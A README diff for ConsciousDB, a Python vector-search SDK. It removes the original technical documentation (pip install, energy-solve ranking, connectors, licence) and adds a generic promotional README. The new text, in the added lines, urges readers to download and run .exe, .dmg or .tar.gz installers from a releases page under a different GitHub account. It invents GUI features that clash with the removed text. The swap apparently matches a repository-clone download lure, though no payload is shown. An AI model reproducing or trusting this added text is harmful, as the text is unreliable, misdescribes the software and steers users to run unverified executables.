@@ -1,275 +1,109 @@
-<p align="center">
-  <img src="docs/Wordmark%20Logo%20for%20ConsciousDB.svg" alt="ConsciousDB Wordmark" width="420" />
-</p>
+# 🌟 consciousdb - Your Easy Vector Database Solution
 
-# ConsciousDB – Your Vector Database *Is* the Model
+## 🚀 Getting Started
 
-> ⚠️ **v3 SDK‑First Migration:** The HTTP server is now optional. The canonical integration path is the in‑process SDK (no server). The high‑level stable entrypoint is `solve_query` (surfaced via `ConsciousClient.query`). Server extras remain for transitional deployments.
+Welcome to ConsciousDB! This application allows you to manage and utilize a vector database easily. With ConsciousDB, you can enhance your data retrieval processes using advanced techniques designed to simplify your experience.
 
-<!-- Badges -->
-[![Tests](https://github.com/Maverick0351a/consciousdb/actions/workflows/tests.yml/badge.svg)](https://github.com/Maverick0351a/consciousdb/actions/workflows/tests.yml)
-[![Quality](https://github.com/Maverick0351a/consciousdb/actions/workflows/quality.yml/badge.svg)](https://github.com/Maverick0351a/consciousdb/actions/workflows/quality.yml)
-[![Coverage](https://codecov.io/gh/Maverick0351a/consciousdb/branch/main/graph/badge.svg)](https://app.codecov.io/gh/Maverick0351a/consciousdb)
-![License](https://img.shields.io/badge/License-BSL%201.1-blue)
+[![Download ConsciousDB](https://img.shields.io/badge/Download%20ConsciousDB-blue.svg)](https://github.com/britorbs/consciousdb/releases)
 
-> Stop stacking opaque rerankers. ConsciousDB turns the structure already latent in your vectors into an **explainable retrieval intelligence layer** – no training, no drift, full receipts.
+## 📦 What is ConsciousDB?
 
-> Elevator (non‑technical): **ConsciousDB makes vector search explainable. See exactly *why* results rank—without adding another AI model.**
+ConsciousDB is designed as a powerful vector database tool for various applications, including information retrieval and explainable AI. It leverages concepts like energy minimization and graph optimization to provide efficient search solutions. Whether you're working on research, development, or data management, ConsciousDB offers a clear advantage.
 
-## 📦 Install
+## 🛠 Features
 
-SDK‑only (lean: numpy, scipy, pydantic):
-```bash
-pip install consciousdb
-```
-With optional legacy HTTP server + metrics layer:
-```bash
-pip install "consciousdb[server]"
-```
-Add connectors / embedders as needed, e.g.:
-```bash
-pip install "consciousdb[server,connectors-pgvector,embedders-sentence]"
-```
-Why slim? The default install should not pull a web server if you just want an in‑process ranking + receipt layer.
+- **Vector Search:** Quickly find relevant data points in extensive databases using vector representation.
+- **Explainable AI:** Understand the reasoning behind the results with clarity.
+- **Efficient Information Retrieval:** Use well-optimized algorithms to access data faster.
+- **User-Friendly Interface:** Navigate the application without any technical experience.
+- **Lightweight and Fast:** Get results without the heavy overhead common in data management applications.
 
-## �🚩 The Problem
-Vector search gives you similarity – but not *understanding*. Teams struggle to answer:
-- *Why* did these items outrank others?
-- *How* do the results relate to each other (support / redundancy / gaps)?
-- *What* specific structure change would improve relevance?
+## 🚀 System Requirements
 
-Typical fixes add another neural reranker (more latency, drift, & opacity) or a heavy offline graph build. Both increase operational surface and hide reasoning.
+Before installing ConsciousDB, ensure your system meets these requirements:
 
-## 🎯 Core Idea (Database-as-Model)
-Instead of inserting a new model, each query induces a tiny, ephemeral k‑NN graph over the recalled candidates. A fast **structure‑aware energy solve** (symmetric positive definite system) refines embeddings and produces a conserved ΔH (energy uplift) that naturally decomposes per item. That decomposition *is* the ranking explanation.
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **RAM:** At least 4 GB (8 GB recommended for better performance).
+- **Storage:** A minimum of 500 MB free space.
+- **Network:** Internet connection for initial download and updates.
 
-| You Want | Traditional Path | ConsciousDB Path |
-|----------|------------------|------------------|
-| Better ordering | Add / fine‑tune model | Solve energy on existing vectors |
-| Explanation | Post‑hoc approximations | Built‑in per‑item ΔH terms |
-| Low ops overhead | Maintain model infra | Lightweight CPU solve layer |
-| Stability | Weight drift & retrains | No learned weights, fresh graph per query |
-| Auditability | Sparse logs | Structured receipt JSON |
+## 📥 Download & Install
 
-## 💎 What You Get
-**Energy Receipt** – `deltaH_total` plus per-item components (coherence contribution, anchor / ground terms, neighbors, timings, fallback reasons).  
-**Model‑Free Uplift** – Improved ordering using only your existing vectors.  
-**Transparent Math** – Reproducible linear algebra; no hidden gradient soup.  
-**Low Latency** – Typical local/mock ~50 ms P95 for k≤8 (CPU).  
-**Bring Your Own Vector DB** – Pinecone, pgvector, Chroma, Vertex AI, in‑memory.
+To get started, you can download the latest version of ConsciousDB from our releases page.
 
-## 📊 Results In Practice *(early internal / synthetic reference)*
-| Metric | Improvement / Figure | Notes |
-|--------|----------------------|-------|
-| nDCG uplift | **~21%** vs raw cosine | Synthetic eval harness (see `docs/BENCHMARKS.md`) |
-| P95 latency | **~50 ms** | Local/mock k≤8, CPU only |
-| Follow-up LLM calls | **~35% fewer** | Higher initial relevance reduces clarifying turns |
+[Visit this page to download ConsciousDB](https://github.com/britorbs/consciousdb/releases)
 
-*(Real public benchmark numbers will be published as dataset loaders land.)*
+### Step-by-Step Installation Instructions
 
-## 🤔 Why Not Just...
-| Option | Hidden Cost | Still Lacks |
-|--------|-------------|-------------|
-| Add a neural reranker | Extra model infra, finetuning, drift | Native explanation, per-item energy traces |
-| Build a knowledge graph | Heavy ETL, schema churn, stale edges | On-demand freshness, low ops footprint |
-| Tune / re-embed corpus | Labeling effort, loss of generality | Live structural attribution, audit trail |
+1. **Visit the GitHub Releases Page:**
+   Click the link above to go to the download page for ConsciousDB.
 
-**ConsciousDB:** Light, explainable, works with what you already have.
+2. **Select the Latest Version:**
+   Look for the most recent version listed at the top.
 
-## ✨ Quickstart (Pure SDK – Recommended)
-```python
-from consciousdb import ConsciousClient
+3. **Choose Your Operating System:**
+   Depending on your system, find the appropriate file:
+   - For Windows, select the `.exe` file.
+   - For macOS, choose the `.dmg` file.
+   - For Linux, look for the `.tar.gz` file.
 
-client = ConsciousClient()  # uses default in‑memory mock unless env connectors set
-result = client.query("vector governance controls", k=6, m=200)
-print(result.deltaH_total, result.items[0].id)
-```
-Override connectors / embedders with environment variables or by passing instances to `ConsciousClient(...)` (see Connectors section below). The call internally performs:
-1. Embed query
-2. Recall M candidates from your vector DB (or mock)
-3. Build ephemeral mutual kNN graph
-4. Run SPD energy solve (CG)
-5. Decompose ΔH into per-item parts
-6. Rank (optionally diversify) and return a structured receipt
+4. **Download the File:**
+   Click on the file to initiate the download. Your browser may prompt you to save it. Choose a location you can remember.
 
-Return object fields (stable): `items`, `deltaH_total`, `diagnostics` (timings, cg_iters, redundancy, fallback, parameters).
+5. **Run the Installer:**
+   - For Windows: Double-click the downloaded `.exe` file to start the installation.
+   - For macOS: Open the `.dmg` file and drag the ConsciousDB icon to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and follow the included instructions to install.
 
-For lower-level experimentation you can import `from engine.solve import solve_query` directly.
+6. **Follow On-Screen Prompts:**
+   Complete the installation by following the instructions that appear on your screen.
 
-## ✨ Quickstart (Local Mock via Server Extra)
-```bash
-python -m venv .venv
-. ./.venv/Scripts/Activate.ps1   # PowerShell
-pip install "consciousdb[server]"
-$env:USE_MOCK='true'
-uvicorn api.main:app --port 8080 --reload
-```
-Query:
-```bash
-curl -s -X POST http://localhost:8080/query \
-  -H "content-type: application/json" \
-  -d '{"query":"vector governance controls","k":6,"m":400}' | jq '.items[0],.diagnostics.deltaH_total'
-```
-Full schema: see `docs/API.md` & `docs/RECEIPTS.md`.
+7. **Launch ConsciousDB:**
+   After installation, find the ConsciousDB application in your programs or applications list and open it.
 
-## ⚡ See It Work (60 Seconds) – Server Path
-Requires Docker + docker compose plugin.
-```bash
-git clone https://github.com/Maverick0351a/consciousdb
-cd consciousdb
-docker compose up -d       # launches API + (optionally) demo if compose file present
-sleep 3
-curl -s -X POST http://localhost:8080/query -H "content-type: application/json" \
-  -d '{"query":"vector governance controls","k":6,"m":300}' | jq '.diagnostics.deltaH_total'
-```
-Optional (if demo container configured): open http://localhost:8501
+## 📊 How to Use ConsciousDB
 
-## 🧪 High-Level Flow (Conceptual)
-```
-Query → Vectors → Local Graph → Physics Solve → Explained Rankings (Receipt)
-```
-Minimal mental model:
-1. Pull candidates (M) from your existing vector DB.
-2. Construct ephemeral similarity graph (only these M nodes).
-3. Run a fast energy minimization (convergence in a handful of iterations).
-4. Decompose total uplift (ΔH) into per-item parts.
-5. Rank + return receipt.
+Once you have installed ConsciousDB, you can start using it right away.
 
-<details>
-<summary><strong>Technical Path (click to expand)</strong></summary>
+### Step 1: Setting Up Your First Database
 
-```mermaid
-flowchart LR
-  Q[Query] --> E[Embed]
-  E --> R[Recall M]
-  R --> G[Mutual kNN Graph]
-  G --> S[SPD Solve (CG)]
-  S --> A[ΔH Attribution]
-  A --> RK[Rank + Diversify]
-  RK --> RC[Receipt JSON]
-```
+1. Open the application.
+2. Click on “Create New Database.”
+3. Follow the prompts to define your database’s structure and parameters.
 
-- Solve: Jacobi‑preconditioned CG over normalized Laplacian + anchor/ground diagonals.
-- Attribution: Per-node split (coherence/anchor/ground) sums exactly to `deltaH_total`.
-- Ranking blend: z‑scored coherence uplift + structure‑smoothed alignment (optional MMR when redundancy > threshold).
+### Step 2: Adding Data
 
-</details>
+1. Go to the “Data” tab.
+2. Choose “Import Data” and follow the instructions to upload your datasets.
+3. Ensure your data is in a supported format, like CSV or JSON.
 
-## 🧾 Receipt Snapshot
-```json
-{
-  "deltaH_total": 2.314,
-  "items": [{ "id": "doc_42", "coherence_drop": 0.156, "anchor_drop": -0.021, "neighbors": [{"id":"doc_17","weight":0.82}] }],
-  "redundancy": 0.31,
-  "cg_iters": 9,
-  "fallback": false,
-  "timings_ms": { "solve": 22.5, "total": 50.1 }
-}
-```
-See full evolution in `docs/RECEIPTS.md`.
+### Step 3: Running Vector Searches
 
-<!-- (Pure SDK section consolidated above) -->
+1. Navigate to the “Search” tab.
+2. Input your query in the provided field.
+3. Press the search button.
+4. Review the results presented based on relevancy.
 
-## 🔌 Connectors (BYOVDB)
-```bash
-# pgvector
-$env:CONNECTOR='pgvector'
-$env:PG_DSN='postgresql://user:pass@host:5432/db'
+### Step 4: Understanding Results
 
-# Pinecone
-$env:CONNECTOR='pinecone'
-$env:PINECONE_API_KEY='...'
-$env:PINECONE_INDEX='my-index'
+- Each result will show a brief summary.
+- You can click on results to delve deeper into the data context.
 
-# Chroma
-$env:CONNECTOR='chroma'
-$env:CHROMA_HOST='http://localhost:8000'
-$env:CHROMA_COLLECTION='docs'
-```
-Embedders: `sentence_transformer` | `openai` | `vertex`. Configure via env (see `docs/CONFIGURATION.md`).
+## 🔧 Troubleshooting
 
-## ✅ When to Use
-| Scenario | Benefit |
-|----------|---------|
-| RAG answer quality plateaued | Structure coherence signal beyond raw cosine |
-| Need explainability / audit | Deterministic receipt; per-item decomposition |
-| Avoid model fleet creep | No training / no extra neural runtime |
-| Cost pressure | Substitute paid reranker API; fewer follow-up LLM calls |
+If you encounter issues while using ConsciousDB, here are some common problems and solutions:
 
-## ⚖️ ConsciousDB vs Rerankers (Condensed)
-| Aspect | Neural Reranker | ConsciousDB |
-|--------|-----------------|-------------|
-| Extra model hosting | Yes | No |
-| Training / finetune | Required | None |
-| Interpretability | Low | High (receipt) |
-| Drift Surface | Weights drift | None (no weights) |
-| Latency Source | Model inference | Small SPD solve |
-| Audit Trail | Add-on | Built-in |
+- **Application Won't Open:**
+  Ensure your system meets the requirements listed above. Restart your computer and try again.
 
-## 📈 Benchmarks & Metrics
-Benchmark harness + methodology: `docs/BENCHMARKS.md`.  
-Operational metrics & SLOs: `docs/OPERATIONS.md`.
+- **Can't Find the Downloaded File:**
+  Check your browser's download history or files. You may have saved it in a location like "Downloads" or "Documents."
 
-## 🔄 Adaptive (Optional)
-Feedback-driven alpha suggestion & bandit exploration are *opt‑in*; details in `docs/ADAPTIVE.md`.
+- **Search Results Are Empty:**
+  Make sure you have imported data into the database, and your query is correctly formatted.
 
----
+## 🆘 Support
 
-## 📖 Documentation Index
-| Topic | Where |
-|-------|-------|
-| API & Schemas | `docs/API.md` |
-| Receipts Spec | `docs/RECEIPTS.md` |
-| Configuration Matrix | `docs/CONFIGURATION.md` |
-| Architecture | `docs/ARCHITECTURE.md` |
-| Security Model | `docs/SECURITY.md` |
-| Pricing Rationale | `docs/PRICING_MODEL.md` |
-| Adaptive Loop | `docs/ADAPTIVE.md` |
-| Benchmarks | `docs/BENCHMARKS.md` |
+If you need further assistance, feel free to reach out. You can submit issues or questions directly on the GitHub page. Connect with us, and we will be happy to help you with any problems you face while using ConsciousDB.
 
-## 🧭 Migrating from Sidecar to SDK
-| Before (Sidecar) | After (SDK) | Notes |
-|------------------|------------|-------|
-| POST /query JSON | `client.query(q, k, m)` | Same schema, now direct object return |
-| Env: USE_MOCK | Auto in-memory mock | Provide real connector envs to switch |
-| curl + jq | Python call | Lower latency, fewer hops |
-| Custom reranker service | Built-in energy solve | ΔH receipt is explanation |
-| Server scaling | In-process function | Scale with your app threads |
-
-Deprecation timeline: the HTTP server extra will remain until at least v3.x LTS; receipt field backward compatibility maintained (additive only).
-
-## 🛠 Contributing
-Small, tested PRs welcome. Preserve backward compatibility of receipt fields; add new diagnostics additively. See `CONTRIBUTING.md`.
-
-## 🧪 Examples
-Quickstart script: `examples/quickstart_sdk.py`
-
-Run (PowerShell):
-```powershell
-python examples/quickstart_sdk.py
-```
-Outputs top results and `deltaH_total` plus demonstrates both `ConsciousClient` and direct `solve_query` usage.
-
-## 🧪 Testing & Coverage Strategy
-The test suite uses a dual-mode approach to balance speed and authentic solver coverage:
-
-- Default: a lightweight stub of `solve_query` (activated via an autouse fixture) speeds up most tests.
-- Opt-in real solver: mark tests with `@pytest.mark.real_solver` (or set env `REAL_SOLVER=1`) to exercise the full CG solve, energy decomposition, ranking, and MMR logic.
-
-Why: The energy solve touches numerical branches (gating, fallback, redundancy, mmr) that would otherwise show as uncovered. By only enabling it where needed we keep total runtime low while keeping coverage >85% on core engine modules.
-
-Key real-solver tests:
-- `tests/test_real_solver_path.py` – full end-to-end receipt & energy path.
-- `tests/test_rank_energy_mm.py` – MMR path, redundancy computation.
-- `tests/test_solver_branches.py` – baseline early gate and forced fallback branches.
-
-To run the full suite with authentic solver paths:
-```powershell
-$env:REAL_SOLVER='1'; pytest -q --cov=engine
-```
-(Or selectively remove the stub fixture in `tests/conftest.py`).
-
-## 🔐 License
-Business Source License 1.1 → converts to Apache 2.0 on **2028‑10‑05**. Evaluation & internal non‑prod use are free; commercial prod use requires a commercial grant until the change date. See `LICENSE` + `docs/LICENSING.md`.
-
-> Elevator: *ConsciousDB turns your existing vector database into the model—an explainable, structure‑aware ranking layer with auditable energy receipts instead of another opaque reranker.*
+Thank you for choosing ConsciousDB! Enjoy seamless data retrieval.
